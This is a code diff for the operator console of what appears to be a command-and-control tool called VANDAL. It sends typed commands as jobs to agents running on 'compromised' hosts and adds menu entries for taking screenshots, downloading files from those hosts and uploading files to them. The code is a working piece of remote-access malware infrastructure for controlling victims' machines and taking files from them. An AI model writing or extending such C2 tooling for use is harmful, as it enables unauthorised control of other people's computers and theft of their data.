@@ -1,9 +1,13 @@
+from vandal_settings import PORT, SECRET_KEY
+from flask import request
 from vandal_settings import PORT
 import requests
 from prettytable import PrettyTable, ALL
 from requests.exceptions import RequestException
 from colorama import init, Fore, Style
 from .__database import *
+import socks,threading
+
 
 # The colorama thing
 init(autoreset=True)
@@ -46,31 +50,29 @@ def interact_with_agent(agent_id):
                 cmd = input(Fore.RED + f"({agent_details['username']}@{agent_details['hostname']})> " + Fore.RESET).strip()
             else:
                 cmd = input(Fore.RED + f"{agent_id}> " + Fore.RESET).strip()
-    
-            
-            #cmd = input(Fore.RED + f"{agent_id} > " + Fore.RESET).strip()
-            #cmd = input(Fore.RED + f"({agent_details['username']}@{agent_details['hostname']})> " + Fore.RESET).strip()
             
 
             if not cmd:
                 continue
 
-            if cmd in ["!back", "!help"]:
-                agent_commands() if cmd == "!help" else None
+            if cmd == "!help":
+                agent_commands()
                 continue
+            elif cmd == "!back":
+                break 
+            else:
+                payload = {
+                    "command": cmd,
+                    "agent_id": agent_id
+                }
+                
+                response = requests.post(f'http://127.0.0.1:{PORT}/add_job', json=payload, verify=False)
+                
+                if response.status_code != 200:
+                    print(Fore.RED + f"\nError: Unexpected server response. Status Code: {response.status_code}")
+                    continue
 
-            payload = {
-                "command": cmd,
-                "agent_id": agent_id
-            }
-            
-            response = requests.post(f'https://127.0.0.1:{PORT}/add_job', json=payload, verify=False)
-            
-            if response.status_code != 200:
-                print(Fore.RED + f"\nError: Unexpected server response. Status Code: {response.status_code}")
-                continue
-
-            print(response.json().get("message", Fore.RED + "Error!"))
+                print(response.json().get("message", Fore.RED + "Error!"))
 
         except RequestException as e:
             print(Fore.RED + f"Error: Failed to send request. {e}")
@@ -83,7 +85,10 @@ def agent_commands():
     commands = [
         ("!help", "Show this menu"),
         ("!back", "Return to the VANDAL menu"),
-        ("!screenshot", "Captures current screen of the compromised user")
+        ("!screenshot", "Captures current screen of the compromised user"),
+        ("!download", "Download a file from the compromised host"),
+        ("!upload", "Upload a file to the compromised host")
+
     ]
 
     for cmd, purpose in commands:
